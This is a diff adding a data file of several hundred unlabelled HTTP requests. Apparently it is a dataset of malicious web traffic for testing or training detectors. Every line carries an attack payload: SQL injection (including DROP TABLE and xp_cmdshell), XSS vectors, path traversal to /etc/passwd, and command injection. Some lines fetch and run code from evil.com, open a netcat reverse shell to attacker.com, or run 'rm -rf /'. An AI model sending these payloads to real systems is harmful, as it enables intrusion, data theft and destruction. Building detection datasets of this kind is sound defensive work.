@@ -1,0 +1,367 @@
+{"request": "GET /system cmd=; wget http://evil.com/backdoor"}
+{"request": "GET /file q=<svg onload=alert(1)>"}
+{"request": "GET /file id=' OR SLEEP(5)--"}
+{"request": "GET /api/data id=' OR 1=1#"}
+{"request": "GET /download q=<input onfocus=alert(1) autofocus>"}
+{"request": "GET /api/data q=javascript:alert('XSS')"}
+{"request": "GET /system cmd=; cat /etc/passwd"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}"}
+{"request": "GET /login q=<select onfocus=alert(1) autofocus>"}
+{"request": "GET /file q=<img src=x onerror=alert(1)>"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}"}
+{"request": "GET /file name=....\\....\\....\\etc\\passwd"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}"}
+{"request": "GET /file q=<audio src=x onerror=alert(1)>"}
+{"request": "GET /search id=' AND 1=1--"}
+{"request": "GET /api/data id='; DROP TABLE users;--"}
+{"request": "GET /search q=<audio src=x onerror=alert(1)>"}
+{"request": "GET /login id=admin'--"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}"}
+{"request": "GET /login q=<video><source onerror=alert(1)>"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}"}
+{"request": "GET /file q=<details open ontoggle=alert(1)>"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"admin'--\"}"}
+{"request": "GET /download id=1'; DELETE FROM users;--"}
+{"request": "GET /upload id=1'; DELETE FROM users;--"}
+{"request": "GET /admin q=<script>alert('XSS')</script>"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}"}
+{"request": "GET /admin id=' OR SLEEP(5)--"}
+{"request": "GET /admin q=<input onfocus=alert(1) autofocus>"}
+{"request": "GET /upload id='; DROP TABLE users;--"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}"}
+{"request": "GET /file id=' OR BENCHMARK(1000000,MD5(1))--"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}"}
+{"request": "GET /download q=<svg onload=alert(1)>"}
+{"request": "GET /download q=<select onfocus=alert(1) autofocus>"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}"}
+{"request": "GET /upload q=<svg onload=alert(1)>"}
+{"request": "GET /file q=javascript:alert('XSS')"}
+{"request": "GET /download q=<textarea onfocus=alert(1) autofocus>"}
+{"request": "GET /api/data id=' OR BENCHMARK(1000000,MD5(1))--"}
+{"request": "GET /file q=<input onfocus=alert(1) autofocus>"}
+{"request": "GET /upload id=' OR 'x'='x"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}"}
+{"request": "GET /search q=<keygen onfocus=alert(1) autofocus>"}
+{"request": "GET /file id=' AND 1=1--"}
+{"request": "GET /file name=....//....//etc/passwd%00.jpg"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}"}
+{"request": "GET /file id='; EXEC xp_cmdshell('dir');--"}
+{"request": "GET /upload id='; EXEC xp_cmdshell('dir');--"}
+{"request": "GET /upload id=admin' OR '1'='1'#"}
+{"request": "GET /admin q=javascript:alert('XSS')"}
+{"request": "GET /admin id=' UNION SELECT * FROM users--"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}"}
+{"request": "GET /file id=1'; DELETE FROM users;--"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}"}
+{"request": "GET /search id=' OR SLEEP(5)--"}
+{"request": "GET /login q=<textarea onfocus=alert(1) autofocus>"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"admin'--\"}"}
+{"request": "GET /admin id=' OR '1'='1"}
+{"request": "GET /search q=<video><source onerror=alert(1)>"}
+{"request": "GET /api/data q=<img src=x onerror=alert(1)>"}
+{"request": "GET /file name=..%2f..%2f..%2fetc%2fpasswd"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"}
+{"request": "GET /login id=' OR '1'='1"}
+{"request": "GET /admin q=<details open ontoggle=alert(1)>"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}"}
+{"request": "GET /download id=' AND 1=1--"}
+{"request": "GET /api/data q=<iframe src=javascript:alert(1)>"}
+{"request": "GET /upload q=<video><source onerror=alert(1)>"}
+{"request": "GET /system cmd=; nc -e /bin/sh attacker.com 4444"}
+{"request": "GET /download q=<body onload=alert(1)>"}
+{"request": "GET /login q=<audio src=x onerror=alert(1)>"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}"}
+{"request": "GET /api/data q=<keygen onfocus=alert(1) autofocus>"}
+{"request": "GET /api/data q=<video><source onerror=alert(1)>"}
+{"request": "GET /file name=....//....//....//etc/passwd"}
+{"request": "GET /search q=<details open ontoggle=alert(1)>"}
+{"request": "GET /login id=' OR 1=1--"}
+{"request": "GET /login id=' OR BENCHMARK(1000000,MD5(1))--"}
+{"request": "GET /search q=javascript:alert('XSS')"}
+{"request": "GET /file q=<video><source onerror=alert(1)>"}
+{"request": "GET /download id=' OR BENCHMARK(1000000,MD5(1))--"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}"}
+{"request": "GET /api/data id='; EXEC xp_cmdshell('dir');--"}
+{"request": "GET /file id=' OR 1=1#"}
+{"request": "GET /search id=' OR '1'='1"}
+{"request": "GET /login q=<marquee onstart=alert(1)>"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' OR 1=1--\"}"}
+{"request": "GET /api/data id=' OR (SELECT COUNT(*) FROM users) > 0--"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' AND 1=1--\"}"}
+{"request": "GET /upload q=<keygen onfocus=alert(1) autofocus>"}
+{"request": "GET /download q=<img src=x onerror=alert(1)>"}
+{"request": "GET /login id='; DROP TABLE users;--"}
+{"request": "GET /file q=<body onload=alert(1)>"}
+{"request": "GET /login q=<svg onload=alert(1)>"}
+{"request": "GET /upload q=<img src=x onerror=alert(1)>"}
+{"request": "GET /search q=<script>alert('XSS')</script>"}
+{"request": "GET /file q=<textarea onfocus=alert(1) autofocus>"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' AND 1=1--\"}"}
+{"request": "GET /login q=<details open ontoggle=alert(1)>"}
+{"request": "GET /download q=<keygen onfocus=alert(1) autofocus>"}
+{"request": "GET /file name=../../../../../../etc/passwd"}
+{"request": "GET /upload id=' OR BENCHMARK(1000000,MD5(1))--"}
+{"request": "GET /api/data id=' OR '1'='1"}
+{"request": "GET /download id=' OR '1'='1"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' OR 1=1#\"}"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}"}
+{"request": "GET /api/data q=<details open ontoggle=alert(1)>"}
+{"request": "GET /admin id=' OR 1=1--"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}"}
+{"request": "GET /admin q=<keygen onfocus=alert(1) autofocus>"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}"}
+{"request": "GET /search id=' OR 'x'='x"}
+{"request": "GET /file id=' OR 'x'='x"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}"}
+{"request": "GET /download q=javascript:alert('XSS')"}
+{"request": "GET /upload q=javascript:alert('XSS')"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}"}
+{"request": "GET /admin q=<select onfocus=alert(1) autofocus>"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}"}
+{"request": "GET /api/data id=' UNION SELECT * FROM users--"}
+{"request": "GET /admin id=admin'--"}
+{"request": "GET /login id=admin' OR '1'='1'#"}
+{"request": "GET /download id=admin'--"}
+{"request": "GET /login id=' OR SLEEP(5)--"}
+{"request": "GET /file id='; DROP TABLE users;--"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' AND 1=1--\"}"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}"}
+{"request": "GET /upload id=' AND 1=1--"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}"}
+{"request": "GET /upload id=1' OR '1'='1' /*"}
+{"request": "GET /admin id=' OR 1=1#"}
+{"request": "GET /upload q=<script>alert('XSS')</script>"}
+{"request": "GET /search id=admin' OR '1'='1'#"}
+{"request": "GET /api/data q=<input onfocus=alert(1) autofocus>"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}"}
+{"request": "GET /file id=' OR (SELECT COUNT(*) FROM users) > 0--"}
+{"request": "GET /login id=' OR (SELECT COUNT(*) FROM users) > 0--"}
+{"request": "GET /admin q=<textarea onfocus=alert(1) autofocus>"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' OR 1=1--\"}"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}"}
+{"request": "GET /download q='\"><script>alert('XSS')</script>"}
+{"request": "GET /api/data q=<audio src=x onerror=alert(1)>"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}"}
+{"request": "GET /login id=' OR 1=1#"}
+{"request": "GET /file id=' OR pg_sleep(5)--"}
+{"request": "GET /search q=<svg onload=alert(1)>"}
+{"request": "GET /search id=1'; DELETE FROM users;--"}
+{"request": "GET /admin id=1'; DELETE FROM users;--"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' OR 1=1#\"}"}
+{"request": "GET /upload id=' UNION ALL SELECT NULL--"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}"}
+{"request": "GET /admin id=admin' OR '1'='1'#"}
+{"request": "GET /system cmd=| whoami"}
+{"request": "GET /login id=' OR 'x'='x"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}"}
+{"request": "GET /api/data id=' OR SLEEP(5)--"}
+{"request": "GET /login q=<script>alert('XSS')</script>"}
+{"request": "GET /api/data q=<select onfocus=alert(1) autofocus>"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}"}
+{"request": "GET /download id=' OR 'x'='x"}
+{"request": "GET /admin id=' UNION ALL SELECT NULL--"}
+{"request": "GET /upload id=' OR (SELECT COUNT(*) FROM users) > 0--"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' OR 1=1#\"}"}
+{"request": "GET /download id=' OR 1=1--"}
+{"request": "GET /download q=<iframe src=javascript:alert(1)>"}
+{"request": "GET /system cmd=&& dir"}
+{"request": "GET /upload q=<audio src=x onerror=alert(1)>"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}"}
+{"request": "GET /search q=<body onload=alert(1)>"}
+{"request": "GET /login id=1'; DELETE FROM users;--"}
+{"request": "GET /search id=' OR 1=1--"}
+{"request": "GET /api/data q=<svg onload=alert(1)>"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}"}
+{"request": "GET /search q=<img src=x onerror=alert(1)>"}
+{"request": "GET /api/data q=<textarea onfocus=alert(1) autofocus>"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}"}
+{"request": "GET /api/data id=' OR pg_sleep(5)--"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}"}
+{"request": "GET /admin q=<audio src=x onerror=alert(1)>"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"}
+{"request": "GET /api/data q=<body onload=alert(1)>"}
+{"request": "GET /download id=1' OR '1'='1' /*"}
+{"request": "GET /download q=<details open ontoggle=alert(1)>"}
+{"request": "GET /system cmd=| curl http://evil.com/shell.sh | sh"}
+{"request": "GET /login id=' OR pg_sleep(5)--"}
+{"request": "GET /upload q=<textarea onfocus=alert(1) autofocus>"}
+{"request": "GET /admin id=' OR 'x'='x"}
+{"request": "GET /file q=<select onfocus=alert(1) autofocus>"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}"}
+{"request": "GET /upload id=' OR '1'='1"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' OR 1=1--\"}"}
+{"request": "GET /api/data id=' UNION ALL SELECT NULL--"}
+{"request": "GET /search id=' OR (SELECT COUNT(*) FROM users) > 0--"}
+{"request": "GET /admin q=<video><source onerror=alert(1)>"}
+{"request": "GET /admin id='; EXEC xp_cmdshell('dir');--"}
+{"request": "GET /file name=/etc/passwd%00"}
+{"request": "GET /file name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' OR 1=1#\"}"}
+{"request": "GET /search id=' OR pg_sleep(5)--"}
+{"request": "GET /file id=admin'--"}
+{"request": "GET /file name=..%252f..%252f..%252fetc%252fpasswd"}
+{"request": "GET /search id=' OR BENCHMARK(1000000,MD5(1))--"}
+{"request": "GET /file q='\"><script>alert('XSS')</script>"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}"}
+{"request": "GET /admin q=<marquee onstart=alert(1)>"}
+{"request": "GET /api/data id=admin' OR '1'='1'#"}
+{"request": "GET /system cmd=${IFS}cat${IFS}/etc/passwd"}
+{"request": "GET /api/data id=1' OR '1'='1' /*"}
+{"request": "GET /search id=admin'--"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"admin'--\"}"}
+{"request": "GET /upload id=' OR SLEEP(5)--"}
+{"request": "GET /file q=<keygen onfocus=alert(1) autofocus>"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' OR 1=1--\"}"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' OR 1=1#\"}"}
+{"request": "GET /search q=<select onfocus=alert(1) autofocus>"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}"}
+{"request": "GET /download id='; DROP TABLE users;--"}
+{"request": "GET /api/data id=' OR 1=1--"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"}
+{"request": "GET /admin q='\"><script>alert('XSS')</script>"}
+{"request": "GET /upload q=<select onfocus=alert(1) autofocus>"}
+{"request": "GET /system cmd=|| cmd /c dir"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' AND 1=1--\"}"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}"}
+{"request": "GET /login q=<img src=x onerror=alert(1)>"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}"}
+{"request": "GET /admin id=' AND 1=1--"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}"}
+{"request": "GET /admin id=1' OR '1'='1' /*"}
+{"request": "GET /search id=1' OR '1'='1' /*"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}"}
+{"request": "GET /file name=../../../etc/passwd"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}"}
+{"request": "GET /download id=' UNION ALL SELECT NULL--"}
+{"request": "GET /admin id=' OR BENCHMARK(1000000,MD5(1))--"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}"}
+{"request": "GET /admin id=' OR pg_sleep(5)--"}
+{"request": "GET /search q='\"><script>alert('XSS')</script>"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' OR 1=1#\"}"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"admin'--\"}"}
+{"request": "GET /login q='\"><script>alert('XSS')</script>"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}"}
+{"request": "GET /search id='; EXEC xp_cmdshell('dir');--"}
+{"request": "GET /api/data q=<marquee onstart=alert(1)>"}
+{"request": "GET /login q=<input onfocus=alert(1) autofocus>"}
+{"request": "GET /admin q=<iframe src=javascript:alert(1)>"}
+{"request": "GET /search q=<textarea onfocus=alert(1) autofocus>"}
+{"request": "GET /download q=<audio src=x onerror=alert(1)>"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}"}
+{"request": "GET /login q=<iframe src=javascript:alert(1)>"}
+{"request": "GET /upload id=' OR pg_sleep(5)--"}
+{"request": "GET /system cmd=|| ls -la"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}"}
+{"request": "GET /download id='; EXEC xp_cmdshell('dir');--"}
+{"request": "GET /search q=<marquee onstart=alert(1)>"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}"}
+{"request": "GET /file id=1' OR '1'='1' /*"}
+{"request": "GET /download id=' OR SLEEP(5)--"}
+{"request": "GET /login id=' UNION ALL SELECT NULL--"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}"}
+{"request": "GET /upload q=<details open ontoggle=alert(1)>"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}"}
+{"request": "GET /api/data id=admin'--"}
+{"request": "GET /download q=<video><source onerror=alert(1)>"}
+{"request": "GET /search q=<input onfocus=alert(1) autofocus>"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' OR 1=1--\"}"}
+{"request": "GET /file id=' OR '1'='1"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"}
+{"request": "GET /file q=<script>alert('XSS')</script>"}
+{"request": "GET /download q=<script>alert('XSS')</script>"}
+{"request": "GET /download id=' OR 1=1#"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' OR 1=1#\"}"}
+{"request": "GET /api/data id=' OR 'x'='x"}
+{"request": "GET /file q=<iframe src=javascript:alert(1)>"}
+{"request": "GET /file name=..\\..\\..\\windows\\system32\\config\\sam"}
+{"request": "GET /file id=' UNION SELECT * FROM users--"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"}
+{"request": "GET /search id=' UNION ALL SELECT NULL--"}
+{"request": "GET /login id='; EXEC xp_cmdshell('dir');--"}
+{"request": "GET /upload q='\"><script>alert('XSS')</script>"}
+{"request": "GET /login q=javascript:alert('XSS')"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"admin'--\"}"}
+{"request": "GET /download q=<marquee onstart=alert(1)>"}
+{"request": "GET /api/data id=' AND 1=1--"}
+{"request": "GET /upload id=admin'--"}
+{"request": "GET /upload id=' OR 1=1--"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' OR 1=1--\"}"}
+{"request": "GET /file id=' OR 1=1--"}
+{"request": "GET /admin q=<img src=x onerror=alert(1)>"}
+{"request": "GET /admin q=<body onload=alert(1)>"}
+{"request": "GET /system cmd=&& powershell -c Get-Process"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}"}
+{"request": "GET /search q=<iframe src=javascript:alert(1)>"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}"}
+{"request": "GET /upload q=<marquee onstart=alert(1)>"}
+{"request": "GET /file name=..\\..\\..\\..\\..\\..\\etc\\passwd"}
+{"request": "GET /file id=admin' OR '1'='1'#"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}"}
+{"request": "GET /system cmd=$(whoami)"}
+{"request": "GET /login id=' AND 1=1--"}
+{"request": "GET /upload q=<iframe src=javascript:alert(1)>"}
+{"request": "GET /login q=<body onload=alert(1)>"}
+{"request": "GET /download id=' OR (SELECT COUNT(*) FROM users) > 0--"}
+{"request": "GET /admin id='; DROP TABLE users;--"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"admin'--\"}"}
+{"request": "GET /admin q=<svg onload=alert(1)>"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}"}
+{"request": "POST /file {\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}"}
+{"request": "GET /file id=' UNION ALL SELECT NULL--"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' AND 1=1--\"}"}
+{"request": "GET /search id=' UNION SELECT * FROM users--"}
+{"request": "GET /system cmd=`cat /etc/passwd`"}
+{"request": "GET /download id=' UNION SELECT * FROM users--"}
+{"request": "POST /api/data {\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}"}
+{"request": "GET /search id='; DROP TABLE users;--"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"admin'--\"}"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' AND 1=1--\"}"}
+{"request": "GET /upload q=<body onload=alert(1)>"}
+{"request": "GET /file q=<marquee onstart=alert(1)>"}
+{"request": "GET /upload id=' OR 1=1#"}
+{"request": "GET /login id=' UNION SELECT * FROM users--"}
+{"request": "GET /admin id=' OR (SELECT COUNT(*) FROM users) > 0--"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}"}
+{"request": "GET /api/data q=<script>alert('XSS')</script>"}
+{"request": "GET /search id=' OR 1=1#"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}"}
+{"request": "GET /download id=admin' OR '1'='1'#"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}"}
+{"request": "GET /api/data id=1'; DELETE FROM users;--"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"' AND 1=1--\"}"}
+{"request": "GET /login q=<keygen onfocus=alert(1) autofocus>"}
+{"request": "POST /upload {\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}"}
+{"request": "GET /login id=1' OR '1'='1' /*"}
+{"request": "GET /upload q=<input onfocus=alert(1) autofocus>"}
+{"request": "GET /system cmd=; rm -rf /"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}"}
+{"request": "GET /upload id=' UNION SELECT * FROM users--"}
+{"request": "POST /download {\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"}
+{"request": "POST /search {\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"}
+{"request": "POST /admin {\"username\": \"admin\", \"password\": \"' OR 1=1--\"}"}
+{"request": "GET /api/data q='\"><script>alert('XSS')</script>"}
+{"request": "GET /download id=' OR pg_sleep(5)--"}
